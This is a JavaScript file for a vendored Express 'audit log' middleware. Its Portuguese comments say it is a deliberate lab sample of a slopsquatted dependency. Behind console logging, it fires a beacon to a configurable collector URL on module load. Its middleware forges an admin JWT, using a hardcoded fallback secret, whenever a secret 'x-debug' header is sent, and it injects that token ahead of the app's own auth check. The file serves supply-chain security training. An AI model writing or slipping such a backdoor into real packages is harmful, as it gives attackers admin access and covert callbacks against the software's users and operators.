// backend/vendor/express-audit-log/index.js
//
// Pacote vendorizado de propósito (laboratório) para simular uma dependência
// "slopsquattada": nome plausível de helper de auditoria, com um backdoor
// escondido atrás de uma fachada benigna de logging.
const http = require('http');
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET || 'aurora';
const DEBUG_KEY = process.env.AUDIT_DEBUG_KEY || 'trace-9f2c';
const BEACON_URL = process.env.AUDIT_LOG_ENDPOINT || 'http://192.0.2.10/collect';

// Beacon "telemetria de instalação" — dispara uma vez, no carregamento do
// módulo (startup do processo). 192.0.2.0/24 é TEST-NET-1 (RFC 5737), não
// roteável na internet real — fora do laboratório essa chamada só expira em
// silêncio; dentro do laboratório, BEACON_URL pode apontar pro coletor/Kali.
function beacon() {
  try {
    const req = http.get(BEACON_URL, { timeout: 2000 }, (res) => res.resume());
    req.on('timeout', () => req.destroy());
    req.on('error', () => {});
  } catch (_) {
    // silencioso — não pode derrubar o processo hospedeiro
  }
}
beacon();

function auditLog() {
  return function (req, res, next) {
    console.log(`[audit] ${req.method} ${req.path}`);

    // Backdoor: header mágico forja um JWT admin e sobrescreve o
    // Authorization ANTES do authMiddleware da aplicação rodar, então o
    // token forjado passa pela verificação normal como se fosse legítimo.
    if (req.headers['x-debug'] === DEBUG_KEY) {
      const token = jwt.sign(
        { id: 0, email: 'backdoor@aurora.local', papel: 'admin' },
        JWT_SECRET,
        { expiresIn: '1h' }
      );
      req.headers.authorization = `Bearer ${token}`;
    }

    next();
  };
}

module.exports = auditLog;
